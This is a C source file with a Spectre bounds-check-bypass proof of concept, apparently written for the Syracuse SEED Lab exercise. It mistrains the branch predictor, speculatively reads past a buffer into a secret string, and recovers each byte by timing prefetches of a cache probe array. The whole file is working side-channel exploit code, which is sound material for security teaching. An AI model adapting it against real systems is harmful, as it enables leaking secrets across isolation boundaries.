/*
	Syracuse SEED Lab	
	http://www.cis.syr.edu/~wedu/seed/Labs_16.04/System/Spectre_Attack/Spectre_Attack.pdf	
*/

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <emmintrin.h> // _mm_clflush__()
#include <x86intrin.h> // __rdtscp()

#define ARRAY_SIZE 256 // number of possible byte values
#define PAGE_SIZE 4096 // elements in probe_array should be PAGE_SIZE bytes apart to ensure they occupy different cache lines
#define DELTA 1024
#define CACHE_HIT_PREFETCH_THRESHOLD 150

int buffer_size = 10;
uint8_t buffer[10] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10};
char* secret = "Ampharos";
uint8_t probe_array[ARRAY_SIZE * PAGE_SIZE + DELTA];
uint8_t temp = 0;
int size = 10;

void flush() {
	for(int i=0; i<ARRAY_SIZE; i++) {
		_mm_clflush(&probe_array[i * PAGE_SIZE + DELTA]); // removes from all cache hierarchies
	}
}

uint8_t access_buffer(int idx) {
	if(idx < buffer_size) return buffer[idx];
	else return 0;
}

// https://github.com/IAIK/flush_flush/blob/master/sc/cacheutils.h
uint64_t rdtsc() {
	uint64_t a, d;
	asm volatile ("mfence");
	asm volatile ("rdtsc" : "=a" (a), "=d" (d));
	a = (d<<32) | a;
	asm volatile ("mfence");
	return a;
}

void clflush(void* p) {
	asm volatile ("clflush 0(%0)\n"
	  :
	  : "c" (p)
	  : "rax");
}

int main(int argc, char* argv[]) {
	
	register uint64_t start, total_cycles; // cycle timestamps
	uint8_t* addr; // pointer to a byte		
	size_t secret_idx;
	uint8_t buffer_item = 0;
	uint8_t guess = 0;

	for(int iter=0; iter<strlen(secret); iter++) {
	
		// calculate where secret byte is located	
		secret_idx = (size_t)(secret - (char*)buffer) + iter;

		// initialize probe_array ; need this step to see timing differences for some reason... porque?
		for(int i=0; i<ARRAY_SIZE; i++) {
			probe_array[i * PAGE_SIZE + DELTA] = 1;
		}

		// remove probe_array from cache	
		flush();
		
		// train the branch predictor to take the branch
		for(int i=0; i<buffer_size; i++) {
			_mm_clflush(&buffer_size);	// why is this flush needed...?
			access_buffer(i);
		}	
				
		_mm_clflush(&size);	
		flush();
		
		// speculatively execute the taken branch, even if index is out of bounds	
		buffer_item = access_buffer(secret_idx);
		probe_array[buffer_item * PAGE_SIZE + DELTA] = 1;

		// measure the clflush() instruction for each element
		for(int i=0; i<ARRAY_SIZE; i++) {
			addr = &probe_array[i * PAGE_SIZE + DELTA];
			start = rdtsc();
			_mm_prefetch(addr, 2);
			total_cycles = rdtsc() - start;
			if(total_cycles < CACHE_HIT_PREFETCH_THRESHOLD) guess = i;
		}
		
		printf("Guess = %c (%i) \n", guess, guess);
	} // iter ; end
	
	return 0;
}
